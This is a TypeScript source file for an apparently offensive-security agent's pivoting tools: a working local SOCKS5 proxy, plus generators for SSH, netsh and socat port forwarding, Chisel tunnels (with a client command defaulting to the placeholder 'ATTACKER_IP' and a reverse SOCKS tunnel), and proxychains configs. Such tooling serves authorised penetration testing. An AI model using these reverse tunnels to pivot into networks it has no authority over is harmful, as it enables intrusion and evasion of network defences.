import { Tool } from './Tool.js';
import * as net from 'net';

// ─── 1. SOCKS5 Proxy ────────────────────────────────────────────────────────────
let socksServer: net.Server | null = null;
let socksPort = 0;

export class SocksProxyTool implements Tool {
    name = 'socks_proxy';
    description = 'Native SOCKS5 proxy server. Supports start/stop/status.';
    schema = {
        type: 'object',
        properties: {
            action: { type: 'string', enum: ['start', 'stop', 'status'], description: 'Proxy action' },
            port: { type: 'number', description: 'Listen port (default 1080)' }
        },
        required: ['action'],
        additionalProperties: false
    };

    async execute(args: { action: string; port?: number }): Promise<string> {
        switch (args.action) {
            case 'start': {
                if (socksServer) return `[SOCKS5] Already running on port ${socksPort}`;
                const port = args.port || 1080;
                return new Promise<string>((resolve) => {
                    socksServer = net.createServer((client) => {
                        client.once('data', (greetingBuf: Buffer) => {
                            // SOCKS5 greeting: [VER, NMETHODS, METHODS...]
                            if (greetingBuf[0] !== 0x05) { client.destroy(); return; }
                            // No auth
                            client.write(Buffer.from([0x05, 0x00]));

                            client.once('data', (requestBuf: Buffer) => {
                                // [VER, CMD, RSV, ATYP, DST.ADDR, DST.PORT]
                                if (requestBuf[0] !== 0x05 || requestBuf[1] !== 0x01) {
                                    client.write(Buffer.from([0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0]));
                                    client.destroy();
                                    return;
                                }

                                let host = '';
                                let portOffset = 0;
                                const atyp = requestBuf[3];

                                if (atyp === 0x01) { // IPv4
                                    host = `${requestBuf[4]}.${requestBuf[5]}.${requestBuf[6]}.${requestBuf[7]}`;
                                    portOffset = 8;
                                } else if (atyp === 0x03) { // Domain
                                    const len = requestBuf[4];
                                    host = requestBuf.subarray(5, 5 + len).toString();
                                    portOffset = 5 + len;
                                } else if (atyp === 0x04) { // IPv6
                                    const parts: string[] = [];
                                    for (let i = 0; i < 16; i += 2) {
                                        parts.push(requestBuf.readUInt16BE(4 + i).toString(16));
                                    }
                                    host = parts.join(':');
                                    portOffset = 20;
                                }

                                const dstPort = requestBuf.readUInt16BE(portOffset);

                                const remote = new net.Socket();
                                remote.connect(dstPort, host, () => {
                                    const reply = Buffer.from([0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0]);
                                    client.write(reply);
                                    client.pipe(remote);
                                    remote.pipe(client);
                                });

                                remote.on('error', () => {
                                    client.write(Buffer.from([0x05, 0x05, 0x00, 0x01, 0, 0, 0, 0, 0, 0]));
                                    client.destroy();
                                });
                            });
                        });

                        client.on('error', () => { /* silent */ });
                    });

                    socksServer.listen(port, '127.0.0.1', () => {
                        socksPort = port;
                        resolve(`[SOCKS5] Proxy started on 127.0.0.1:${port}`);
                    });
                    socksServer.on('error', (e: any) => {
                        socksServer = null;
                        resolve(`[SOCKS5 ERROR]: ${e.message}`);
                    });
                });
            }
            case 'stop':
                if (!socksServer) return '[SOCKS5] No proxy running.';
                socksServer.close();
                socksServer = null;
                return `[SOCKS5] Proxy stopped (was on port ${socksPort}).`;
            case 'status':
                return socksServer
                    ? `[SOCKS5] Running on 127.0.0.1:${socksPort}`
                    : '[SOCKS5] Not running.';
            default:
                return `[ERROR]: Unknown action "${args.action}"`;
        }
    }
}

// ─── 2. Port Forward ────────────────────────────────────────────────────────────
export class PortForwardTool implements Tool {
    name = 'port_forward';
    description = 'Generate port forwarding commands (SSH, netsh, socat).';
    schema = {
        type: 'object',
        properties: {
            type: { type: 'string', enum: ['local', 'remote', 'dynamic'], description: 'Forwarding type' },
            localPort: { type: 'number', description: 'Local port' },
            remoteHost: { type: 'string', description: 'Remote host' },
            remotePort: { type: 'number', description: 'Remote port' },
            sshHost: { type: 'string', description: 'SSH jump host (for SSH method)' },
            method: { type: 'string', enum: ['ssh', 'netsh', 'socat'], description: 'Method' }
        },
        required: ['type', 'localPort', 'method'],
        additionalProperties: false
    };

    async execute(args: { type: string; localPort: number; remoteHost?: string; remotePort?: number; sshHost?: string; method: string }): Promise<string> {
        const { localPort, remoteHost, remotePort, sshHost, method } = args;

        const commands: Record<string, Record<string, string>> = {
            ssh: {
                local: `ssh -L ${localPort}:${remoteHost || 'localhost'}:${remotePort || localPort} ${sshHost || 'user@jumphost'} -N -f`,
                remote: `ssh -R ${remotePort || localPort}:localhost:${localPort} ${sshHost || 'user@jumphost'} -N -f`,
                dynamic: `ssh -D ${localPort} ${sshHost || 'user@jumphost'} -N -f`,
            },
            netsh: {
                local: `netsh interface portproxy add v4tov4 listenport=${localPort} listenaddress=0.0.0.0 connectport=${remotePort || localPort} connectaddress=${remoteHost || 'localhost'}`,
                remote: `netsh interface portproxy add v4tov4 listenport=${localPort} listenaddress=0.0.0.0 connectport=${remotePort || localPort} connectaddress=${remoteHost || 'localhost'}`,
                dynamic: `# netsh does not support dynamic SOCKS forwarding. Use SSH -D instead.`,
            },
            socat: {
                local: `socat TCP-LISTEN:${localPort},fork TCP:${remoteHost || 'localhost'}:${remotePort || localPort}`,
                remote: `socat TCP-LISTEN:${localPort},fork TCP:${remoteHost || 'localhost'}:${remotePort || localPort}`,
                dynamic: `# socat does not support SOCKS. Use SSH -D or the built-in SOCKS5 proxy.`,
            },
        };

        const cmd = commands[method]?.[args.type];
        if (!cmd) return `[ERROR]: Invalid method/type combination`;

        const cleanup: Record<string, string> = {
            netsh: `netsh interface portproxy delete v4tov4 listenport=${localPort} listenaddress=0.0.0.0`,
            ssh: `# Kill the SSH tunnel process`,
            socat: `# Kill the socat process`,
        };

        return [`[PORT FORWARD — ${method.toUpperCase()} ${args.type.toUpperCase()}]`, '', '── Deploy ──', cmd, '', '── Cleanup ──', cleanup[method] || ''].join('\n');
    }
}

// ─── 3. Chisel Manage ───────────────────────────────────────────────────────────
export class ChiselManageTool implements Tool {
    name = 'chisel_manage';
    description = 'Generate Chisel HTTP tunnel setup commands.';
    schema = {
        type: 'object',
        properties: {
            role: { type: 'string', enum: ['server', 'client'], description: 'Server or client' },
            serverHost: { type: 'string', description: 'Server host (for client mode)' },
            port: { type: 'number', description: 'Chisel port (default 8080)' },
            tunnelSpec: { type: 'string', description: 'Tunnel specification (e.g., "8080:10.0.0.1:80", "R:socks")' },
            auth: { type: 'string', description: 'Auth user:pass (optional)' }
        },
        required: ['role', 'port'],
        additionalProperties: false
    };

    async execute(args: { role: string; serverHost?: string; port: number; tunnelSpec?: string; auth?: string }): Promise<string> {
        const authFlag = args.auth ? ` --auth ${args.auth}` : '';

        if (args.role === 'server') {
            const cmd = `chisel server --port ${args.port} --reverse${authFlag}`;
            return [`[CHISEL — SERVER]`, `Port: ${args.port}`, '', cmd].join('\n');
        }

        const host = args.serverHost || 'ATTACKER_IP';
        const tunnel = args.tunnelSpec || 'R:socks';
        const cmd = `chisel client ${host}:${args.port} ${tunnel}${authFlag}`;
        return [`[CHISEL — CLIENT]`, `Server: ${host}:${args.port}`, `Tunnel: ${tunnel}`, '', cmd].join('\n');
    }
}

// ─── 4. Proxychains Config ──────────────────────────────────────────────────────
export class ProxyChainConfigTool implements Tool {
    name = 'proxy_chain_config';
    description = 'Generate proxychains configuration file content.';
    schema = {
        type: 'object',
        properties: {
            proxies: { type: 'array', items: { type: 'object', properties: { type: { type: 'string' }, host: { type: 'string' }, port: { type: 'number' } }, required: ['type', 'host', 'port'] }, description: 'List of proxies' },
            mode: { type: 'string', enum: ['strict_chain', 'dynamic_chain', 'random_chain'], description: 'Chain mode (default: dynamic_chain)' }
        },
        required: ['proxies'],
        additionalProperties: false
    };

    async execute(args: { proxies: { type: string; host: string; port: number }[]; mode?: string }): Promise<string> {
        const mode = args.mode || 'dynamic_chain';
        const lines = [
            `# proxychains.conf — Generated by VERTEX`,
            `# Save to /etc/proxychains.conf or use: proxychains4 -f this_file.conf <command>`,
            ``,
            mode,
            `proxy_dns`,
            `tcp_read_time_out 15000`,
            `tcp_connect_time_out 8000`,
            ``,
            `[ProxyList]`,
        ];

        for (const p of args.proxies) {
            lines.push(`${p.type}\t${p.host}\t${p.port}`);
        }

        return [`[PROXYCHAINS CONFIG]`, '', lines.join('\n')].join('\n');
    }
}
